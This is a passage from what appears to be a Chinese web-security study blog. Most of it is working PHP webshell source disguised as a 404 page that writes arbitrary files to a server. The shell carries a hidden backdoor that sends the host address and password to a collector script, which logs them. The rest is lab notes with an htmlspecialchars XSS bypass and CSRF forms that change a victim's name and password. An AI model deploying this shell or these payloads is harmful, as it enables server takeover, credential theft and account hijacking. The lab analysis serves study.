punctuation">.</span> <span class="token variable">$out</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-PHP大马"><a href="#4-PHP大马" class="headerlink" title="4.PHP大马"></a>4.PHP大马</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//后门的实现</span><span class="token comment" spellcheck="true">//get.php  , 用于接收数据</span><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/** * Create by jackliu */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"passwd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$fd</span> <span class="token operator">=</span>  <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./box.txt"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">,</span><span class="token string">"IP is: "</span><span class="token punctuation">.</span><span class="token variable">$shell</span><span class="token punctuation">.</span><span class="token string">"  &amp;&amp;  passwd is : "</span><span class="token punctuation">.</span><span class="token variable">$passwd</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//shell.php</span><span class="token comment" spellcheck="true">//可以适当加密混淆</span><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span><span class="token number">404</span> Not Found<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Title<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span>    <span class="token shell-comment comment">#filepath{</span>        width<span class="token punctuation">:</span> 400px<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment">#fileContext{</span>        width<span class="token punctuation">:</span> 500px<span class="token punctuation">;</span>        height<span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type:text/html;charset=utf-8)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * Create by jackliu */</span><span class="token comment" spellcheck="true">//var_dump($_SERVER);</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token string">"14e1b600b1fd579f47433b88e8d85291"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pass</span> <span class="token operator">===</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//right</span>        <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"("</span><span class="token punctuation">.</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token string">")"</span><span class="token punctuation">;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/cs.com/shell/get.php?name=".$ip."&amp;passwd=".$p);</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$path</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filepath'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//文件路径</span>            <span class="token variable">$context</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'fileContext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//文件内容</span>            <span class="token variable">$fd</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$count</span><span class="token operator">=</span> <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">,</span><span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//写入文件，返回的是写入文件的字符个数</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"success"</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>&lt;mark>"</span><span class="token punctuation">.</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token string">"&lt;/mark>&lt;br/>"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"faild"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token delimiter">?></span>    <span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Title<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    服务器<span class="token constant">IP</span>及当前域名<span class="token punctuation">:</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"("</span><span class="token punctuation">.</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token string">")"</span> <span class="token delimiter">?></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>    当前页面的绝对路径<span class="token punctuation">:</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>    当前页面的绝对目录<span class="token punctuation">:</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token constant">__DIR__</span> <span class="token delimiter">?></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>        输入文件路径<span class="token punctuation">:</span> <span class="token markup">&lt;input type="text" name="filepath" id="filepath" value="<span class="token prolog">&lt;?php echo __DIR__."\\1.php" ?></span></span>"<span class="token operator">></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>写入数据<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fileContext<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fileContext<span class="token punctuation">"</span></span> <span class="token attr-name">"</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>     <span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token delimiter">?></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Not Found<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>The requested <span class="token constant">URL</span> <span class="token delimiter">&lt;?php</span> <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$pos</span><span class="token punctuation">)</span> <span class="token delimiter">?></span> was not found on this server<span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>address</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">]</span><span class="token delimiter">?></span> Server at <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token delimiter">?></span> Port <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_PORT'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>address</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//var_dump($_SERVER);</span>    <span class="token delimiter">?></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Not Found<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>The requested <span class="token constant">URL</span> <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token delimiter">?></span> was not found on this server<span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>address</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">]</span><span class="token delimiter">?></span> Server at <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token delimiter">?></span> Port <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_PORT'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>address</span><span class="token punctuation">></span></span></span>    <span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="三、靶场分析"><a href="#三、靶场分析" class="headerlink" title="三、靶场分析"></a>三、靶场分析</h1><h2 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1.XSS"></a>1.XSS</h2><h3 id="绕过htmlspecialchars"><a href="#绕过htmlspecialchars" class="headerlink" title="绕过htmlspecialchars"></a>绕过htmlspecialchars</h3><pre><code>把html进行实体编码，难点在于无法闭合&amp; (ampersand) &amp;amp; " (double quote) &amp;quot;, unless ENT_NOQUOTES is set ' (single quote) &amp;#039; (for ENT_HTML401) or &amp;apos; (for ENT_XML1, ENT_XHTML or ENT_HTML5), but only when ENT_QUOTES is set  &lt; (less than) &amp;lt; &gt; (greater than) &amp;gt; </code></pre><p>但是如下代码可以绕过</p><p>原理，htmlspecialchars对单引号不进行编码，因此，如果存在输出的值在单引号中，可以闭合单引号。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup">&lt;input type='text' value='<span class="token prolog">&lt;?php  echo {$html['comment_text']}; ?></span></span>' <span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//  &lt;input type='text' value= '    xixix'  onclick = ' alert(1)    '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JS事件列表"><a href="#JS事件列表" class="headerlink" title="JS事件列表"></a>JS事件列表</h3><table><thead><tr><th>onchange</th><th>HTML 元素改变</th></tr></thead><tbody><tr><td>onclick</td><td>用户点击 HTML 元素</td></tr><tr><td>onmouseover</td><td>鼠标指针移动到指定的元素上时发生</td></tr><tr><td>onmouseout</td><td>用户从一个 HTML 元素上移开鼠标时发生</td></tr><tr><td>onkeydown</td><td>用户按下键盘按键</td></tr><tr><td>onload</td><td>浏览器已完成页面的加载</td></tr></tbody></table><h2 id="2-CSRF"><a href="#2-CSRF" class="headerlink" title="2.CSRF"></a>2.CSRF</h2><h3 id="POST构造的payload"><a href="#POST构造的payload" class="headerlink" title="POST构造的payload"></a>POST构造的payload</h3><p>抓到的数据包</p><pre class="line-numbers language-http"><code class="language-http">POST /user/updateName.php HTTP/1.1<span class="token header-name keyword">Host:</span> www.z.com<span class="token header-name keyword">Content-Length:</span> 46<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">Origin:</span> http://www.z.com<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="token header-name keyword">Referer:</span> http://www.z.com/user/edit.php<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Cookie:</span> _ga=GA1.2.80458560.1673597664; PHPSESSID=v7esh3daqldmcu27mu8f3gd2e1<span class="token header-name keyword">Connection:</span> closeid=2&amp;username=haozai&amp;submit=%E6%9B%B4%E6%96%B0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230118180253023.png" alt="image-20230118180253023"></p><p>对于有submit的验证的，不能使用js提交</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"http://www.d.com/user/updateName.php"</span> method<span class="token operator">=</span><span class="token string">"post"</span> name<span class="token operator">=</span><span class="token string">"update_name"</span> id<span class="token operator">=</span><span class="token string">"Poc"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token keyword">var</span> formTag <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"Poc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formTag<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>POST构造的payload</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/user/updateName.php<span class="token punctuation">"</span></span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>giaogiao<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>note：<code>这个csrf有点鸡肋，是因为后端代码中不论修改成功与否都刷新了session，因此这里还存在XSS漏洞。主要是因为这里数据包中有ID的值，我们并不知道用户的ID是多少。</code></p><h3 id="GET型构造"><a href="#GET型构造" class="headerlink" title="GET型构造"></a>GET型构造</h3><p>数据包</p><pre class="line-numbers language-http"><code class="language-http">GET /user/updatePass.php?passwd=456&amp;passwd2=456&amp;submit=%E6%9B%B4%E6%96%B0 HTTP/1.1<span class="token header-name keyword">Host:</span> www.z.com<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="token header-name keyword">Referer:</span> http://www.z.com/user/edit.php<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Cookie:</span> _ga=GA1.2.80458560.1673597664; PHPSESSID=v7esh3daqldmcu27mu8f3gd2e1<span class="token header-name keyword">Connection:</span> close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload构造1</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/user/updatePass.php<span class="token punctuation">"</span></span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token 